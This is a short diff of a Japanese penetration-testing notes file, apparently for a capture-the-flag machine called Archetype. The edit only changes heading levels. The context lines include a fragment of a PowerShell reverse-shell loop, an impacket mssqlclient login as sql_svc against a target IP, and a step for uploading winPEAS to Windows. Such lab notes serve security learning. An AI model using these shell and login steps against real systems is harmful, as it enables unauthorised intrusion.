@@ -190,9 +190,9 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 ```
 
 
-## 🔴tools
+# 🔵tools
 
-### impacket
+## impacket
 ネットワークプロトコル実装ツールキット
 ```
 | プロトコル | 対応ツールの例                                                 |
@@ -216,7 +216,7 @@ MSSQL サーバ（TCP 1433）へログインして、SQL クエリを実行で�
 ```
 python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
 ```
-### winPEAS
+## winPEAS
 
 #### 1. Kaliなどから Windows に winPEAS をアップロード
 ```
